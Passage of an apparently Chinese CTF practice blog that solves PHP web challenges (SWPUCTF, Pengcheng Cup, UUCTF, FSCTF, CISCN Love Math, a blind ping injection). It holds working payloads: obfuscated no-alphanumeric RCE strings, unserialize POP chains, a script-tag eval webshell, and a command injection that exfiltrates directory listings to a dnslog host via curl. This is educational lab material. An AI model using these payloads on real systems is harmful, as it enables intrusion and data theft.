<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&amp;%ff=system&amp;_=cat /f* </span><br></pre></td></tr></table></div></figure>
</blockquote>

        <h3 id="68位">
          <a href="#68位" class="heading-link"><i class="fas fa-link"></i></a><a href="#68位" class="headerlink" title="68位"></a>68位</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//巧妙的把两次$_++放在一起</span></span><br></pre></td></tr></table></div></figure>

<blockquote>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=_.++$_.$a[$_++/$_++].++$_.++$_//$a直接拼接出_POST $$a[_POST]($$a[_])//$_POST[_POST]($_POST[_]) </span><br></pre></td></tr></table></div></figure>
</blockquote>

        <h3 id="62位">
          <a href="#62位" class="heading-link"><i class="fas fa-link"></i></a><a href="#62位" class="headerlink" title="62位"></a>62位</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(_._)[_];<span class="comment">//N  //本地使用就用(_._._)[_]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$%FA=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$$%FA[$%FA=_.++<span class="variable">$_</span>.$%FA[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>]($$%FA[%FF]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//将拼接放到同一行,真的太厉害了,我只能感叹一句nb</span></span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/">日常题目练习（一）</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-15</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="日常题目练习（一）">
          <a href="#日常题目练习（一）" class="heading-link"><i class="fas fa-link"></i></a><a href="#日常题目练习（一）" class="headerlink" title="日常题目练习（一）"></a>日常题目练习（一）</h1>
      
        <h2 id="SWPUCTF-2022-新生赛-ez-ez-unserialize">
          <a href="#SWPUCTF-2022-新生赛-ez-ez-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2022-新生赛-ez-ez-unserialize" class="headerlink" title="SWPUCTF 2022 新生赛]ez_ez_unserialize"></a><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3082">SWPUCTF 2022 新生赛]ez_ez_unserialize</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class X</span><br><span class="line">&#123;</span><br><span class="line">    public $x = &quot;fllllllag.php&quot;;</span><br><span class="line">//    function __construct($x)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;x = $x;</span><br><span class="line">//    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;x !== *__FILE__*) &#123;</span><br><span class="line">            $this-&gt;x = &quot;fllllllag.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        highlight_file($this-&gt;x);</span><br><span class="line">        //flag is in fllllllag.php</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new X();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></div></figure>

<p>简单的pop链书写，注意写的时候construct会报错，将其注释即可</p>

        <h2 id="鹏城杯-2022-简单的php">
          <a href="#鹏城杯-2022-简单的php" class="heading-link"><i class="fas fa-link"></i></a><a href="#鹏城杯-2022-简单的php" class="headerlink" title="[鹏城杯 2022]简单的php"></a>[鹏城杯 2022]简单的php</h2>
      <p>这题学到了一些新的知识点</p>
<p>无参</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if(strlen($code) &gt; 80 or preg_match(&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;,$code))&#123;</span><br><span class="line">        die(&#x27; Hello&#x27;);</span><br><span class="line">    &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;, &#x27;&#x27;, $code))&#123;</span><br><span class="line">        @eval($code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>一个无参rce</p>
<p>一个无数字字母rce，好家伙，可是不简单</p>
<p>无参rce没过滤system<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10212#toc-4">https://xz.aliyun.com/t/10212#toc-4</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>system(current(getallheaders()));</p>
<p>结合无数字字母的异或</p>
<p>?code&#x3D;[<del>%8c%86%8c%8b%9a%92][!%FF]([</del>%9c%8a%8d%8d%9a%91%8b]<a href="%5B~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%5D%5B!%EF%BF%BD%5D()">!%FF</a>); </p>
<p><code>[!%FF]</code>来分割</p>
<p>二维数组进行拼接必须有用[!%FF]进行分隔</p>
<p>##[UUCTF 2022 新生赛]ez_unser</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></div></figure>

<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(*<span class="keyword">__FILE__</span>*);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b=&amp;<span class="variable">$a</span>-&gt;a;</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></div></figure>

<p>本来想绕过wakeup的，结果正则给限制的死死的，这里利用变量传递，将a的值传递给b</p>

        <h2 id="SWPUCTF-2022-新生赛-numgame">
          <a href="#SWPUCTF-2022-新生赛-numgame" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h2>
      <p>查看源码可进入下一关</p>
<p>&#x2F;NsScTf.php</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//hint: 与get相似的另一种请求协议是什么呢 </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123; </span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>); </span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123; </span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>)) </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>提示说是post传参，有些疑惑，</p>
<p>post传</p>
<p>p&#x3D;nss2::ctf</p>
<p>得到flag</p>

        <h2 id="FSCTF-ez-eval">
          <a href="#FSCTF-ez-eval" class="heading-link"><i class="fas fa-link"></i></a><a href="#FSCTF-ez-eval" class="headerlink" title="FSCTF [ez_eval]"></a>FSCTF [ez_eval]</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$word</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;</span>, <span class="variable">$word</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$word</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$word</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span>. <span class="variable">$word</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>多亏了晨曦师傅的指导，本来用的&lt;script${IFS}language&#x3D;’php’&gt;@eval($_POST[a]);</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get：?word=&lt;script%09language=&#x27;php&#x27;&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">post：shell=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></div></figure>

<p>晨曦师傅说${IFS}在bash里才能用</p>

        <h2 id="ping无回显">
          <a href="#ping无回显" class="heading-link"><i class="fas fa-link"></i></a><a href="#ping无回显" class="headerlink" title="ping无回显"></a>ping无回显</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$target</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 1 &#x27;</span> . <span class="variable">$target</span>);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>?ip&#x3D;xhzw8u.dnslog.cn|ls &#x2F;| while read line; do echo $line.xhzw8u.dnslog.cn | xargs curl; done</p>
<p>bzd3p6.dnslog.cn|ls &#x2F;app| while read line; do echo $line.bzd3p6.dnslog.cn | xargs curl; done</p>
<p>dnslog循坏外带</p>

        <h2 id="CISCN-2019初赛-Love-Math">
          <a href="#CISCN-2019初赛-Love-Math" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN-2019初赛-Love-Math" class="headerlink" title="[CISCN 2019初赛]Love Math"></a>[CISCN 2019初赛]Love Math</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这个题即有长长的黑名单过滤，还有字符的过滤，麻了。题目描述有数学函数，尝试了一个数学函数</p>
<p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029204949806-1700015833096-28.png" alt="image-20231029204949806"></p>
<p>发现正好可以执行，看到题目里给的网站，。里面好多的数学函数利用，猜测主要利用到base_convert()</p>
<p>他可以实现任意进制之间的转换</p>
<p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029205130112-1700015833096-30.png" alt="image-20231029205130112"></p>
<p>经过了解哈，最高可以到36进制</p>
<p><strong>36进制</strong>，是数据的一种表示方法。同我们日常生活中的表示法不一样。它由0-9，A-Z组成，字母不区分大小写。与10进制的对应关系是：0-9对应0-9；A-F对应10-35。</p>
<p>进制说明：36进制是 0-Z （0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ）。</p>
<p>这个函数的作用是任何进制之间转换数字</p>
<p>这里用大于26的进制就能构造</p>
<p>这里我没想的到的是，这里构造的高进制数字会当作字符串处理,而不是当作数字处理</p>
<p>测试一下，可行转换可以用赛博厨子的frombase解密（就是从36进制转到10进制）</p>
<p>?c&#x3D;base_convert(55490343972,10,36)()</p>
<p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029211044492-1700015833096-32.png" alt="image-20231029211044492"></p>
<p>之后同理，我们拼接system</p>
<p>这里我们可以构造字母那其实构造别的符号可以先构造别的函数实现</p>
<p>这里用这两个</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dechex()函数：</span><br><span class="line">可以将十进制转换为十六进制</span><br><span class="line">hex2bin()函数：</span><br><span class="line">可以将十六进制转换为ascii码</span><br></pre></td></tr></table></div></figure>

<p>那么单引号就是</p>
<p>?c&#x3D;base_convert(37907361743,10,36)(27)</p>
<p>这里想办法构造一个参数传入点，类似$_GET[1]这样</p>
<p>这里_ 和 []过滤了 因此要用前面小数点的方法构造</p>
<p>为了省长度 一次性把_GET都构造出来</p>
